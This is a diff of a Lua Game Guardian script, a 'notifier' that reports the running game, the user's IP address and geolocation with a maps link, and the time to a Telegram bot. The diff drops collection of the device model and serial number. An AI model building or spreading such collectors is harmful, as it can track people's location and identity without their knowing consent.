@@ -2,25 +2,23 @@
 local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 local CHAT_ID = "YOUR_CHAT_ID_HERE"
 
--- [[ JULES-CORE ULTIMATE NOTIFIER ]]
--- Fitur: IP Tracking, Geolocation, Device Info, Game Detection, Time/Date
+-- [[ JULES-CORE MODERN NOTIFIER ]]
+-- Fitur: IP Tracking, Geolocation, Game Detection, Time/Date
 
-local function get_device_info()
-    local info = gg.getTargetInfo()
-    local gameName = info and info.label or "Unknown Game"
-    local package = info and info.packageName or "Unknown Package"
+local function get_session_info()
+    local gameName = "Unknown Game"
+    local package = "Unknown Package"
 
-    -- Mengambil properti perangkat (Memerlukan Game Guardian versi terbaru)
-    local model = gg.getDeviceProperty('ro.product.model') or "Unknown Model"
-    local android = gg.getDeviceProperty('ro.build.version.release') or "Unknown"
-    local serial = gg.getDeviceProperty('ro.serialno') or "Unknown ID"
+    -- Menggunakan pcall untuk mencegah crash jika fungsi tidak tersedia
+    local status, info = pcall(gg.getTargetInfo)
+    if status and info then
+        gameName = info.label or gameName
+        package = info.packageName or package
+    end
 
     return {
         game = gameName,
-        package = package,
-        model = model,
-        android = android,
-        id = serial
+        package = package
     }
 end
 
@@ -55,7 +53,7 @@ local function send_report()
     local date = os.date("%Y-%m-%d")
     local time = os.date("%H:%M:%S")
 
-    local dev = get_device_info()
+    local session = get_session_info()
     local loc = get_location()
 
     local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
@@ -68,14 +66,9 @@ local function send_report()
                     "╠════════════════════════════════════╣\n" ..
                     "║ DATE: " .. date .. " | TIME: " .. time .. " ║\n" ..
                     "╠════════════════════════════════════╣\n" ..
-                    "║ > DEVICE INFORMATION               ║\n" ..
-                    "║ MODEL   : " .. dev.model .. "\n" ..
-                    "║ ANDROID : v" .. dev.android .. "\n" ..
-                    "║ ID      : " .. dev.id .. "\n" ..
-                    "╠════════════════════════════════════╣\n" ..
                     "║ > SESSION INFORMATION              ║\n" ..
-                    "║ GAME    : " .. dev.game .. "\n" ..
-                    "║ PACKAGE : " .. dev.package .. "\n" ..
+                    "║ GAME    : " .. session.game .. "\n" ..
+                    "║ PACKAGE : " .. session.package .. "\n" ..
                     "╠════════════════════════════════════╣\n" ..
                     "║ > NETWORK & LOCATION               ║\n" ..
                     "║ IP      : " .. (loc and loc.ip or "Unknown") .. "\n" ..
@@ -98,7 +91,7 @@ local function send_report()
     local res = gg.makeRequest(tgUrl, headers, body)
 
     if res and res.code == 200 then
-        gg.alert("✅ Laporan Sistem Berhasil Dikirim.\nGame: " .. dev.game)
+        gg.alert("✅ Laporan Sistem Berhasil Dikirim.\nGame: " .. session.game)
     else
         local err = "❌ Gagal mengirim laporan."
         if res then err = err .. " (Code: " .. res.code .. ")" end
